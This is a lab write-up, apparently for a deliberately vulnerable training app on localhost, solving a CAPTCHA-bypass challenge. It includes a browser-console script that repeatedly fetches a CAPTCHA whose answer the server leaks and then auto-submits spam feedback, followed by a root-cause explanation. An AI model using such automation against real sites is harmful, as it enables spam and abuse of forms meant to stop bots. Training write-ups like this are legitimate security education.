# CAPTCHA Bypass: Submit 10 or More Customer Feedbacks Within 20 Seconds

**Objective:** Submit 10 or more customer feedbacks within 20 seconds.

## Background

The Contact Us feedback form retrieves a CAPTCHA from `GET /rest/captcha/`, which returns a math question along with its own pre-computed answer, e.g.:

```json
{"captchaId": 1, "captcha": "9-6*8", "answer": "-39"}
```

Since the server hands back the answer in the same response, a script can simply fetch a fresh CAPTCHA and immediately submit feedback using the answer it was just given — no actual solving needed. Submitting 10+ feedbacks within 20 seconds this way is far faster than any human typing them one at a time.

## Steps Taken

### 1. Went to the Contact page

```
http://localhost:3000/#/contact
```

<img width="966" height="955" alt="Screenshot 2026-10-12 223638" src="https://github.com/user-attachments/assets/4dc594e4-0d21-4b7a-9e4e-866f4a36f217" />

### 2. Watched the Network tab

Opened DevTools (`F12`) → **Network** tab and reloaded the page, then located the request to:

```
/rest/captcha/
```

<img width="966" height="313" alt="Screenshot 2026-10-12 223815" src="https://github.com/user-attachments/assets/24de6594-4674-4574-8865-c714618e00a1" />

Clicked it and checked its **Response** tab, confirming the shape of the data:

```json
{"captchaId": 1, "captcha": "9-6*8", "answer": "-39"}
```

<img width="966" height="955" alt="Screenshot 2026-10-12 223925" src="https://github.com/user-attachments/assets/83cae2a0-1b25-41ab-bf6e-bde095dda38f" />

### 3. Wrote a submission script

Wrapped the loop inside an async IIFE (`(async () => { ... })();`) so `await` could be used inside it to fetch a fresh CAPTCHA and submit feedback in sequence:

```javascript
(async () => {
  for (let i = 0; i < 15; i++) {
    const response = await fetch(`${location.origin}/rest/captcha/`, {
      method: 'GET',
      headers: { 'Content-type': 'text/plain' }
    });
    if (response.status === 200) {
      const { captchaId, answer } = await response.json();
      await fetch(`${location.origin}/api/Feedbacks`, {
        method: 'POST',
        cache: 'no-cache',
        headers: { 'Content-type': 'application/json' },
        body: JSON.stringify({
          captchaId,
          captcha: `${answer}`,
          comment: `Spam #${i}`,
          rating: 3
        })
      });
    }
  }
})();
```

### 4. Ran the script

Pasted it into the Console and pressed Enter. The loop ran through 15 iterations, each fetching a new CAPTCHA and immediately submitting a feedback with its matching answer.

## Result

Challenge solved — confirmed instantly by the in-app success banner:

> "You successfully solved a challenge: CAPTCHA Bypass (Submit 10 or more customer feedbacks within 20 seconds.)"

<img width="966" height="955" alt="Screenshot 2026-10-12 231111" src="https://github.com/user-attachments/assets/53b8d8fa-f473-486f-9f10-b2961652d0f9" />

<img width="966" height="955" alt="Screenshot 2026-10-12 231251" src="https://github.com/user-attachments/assets/ed35d460-aad4-4787-b0a7-c448d7ffe573" />

## Root Cause

The CAPTCHA endpoint returns the correct answer directly in its own response, along with the question. The server does not require the answer to be computed independently by the client — only that *some* previously issued `captchaId`/`answer` pair be echoed back, making it trivial to automate.

## Status

Solved.
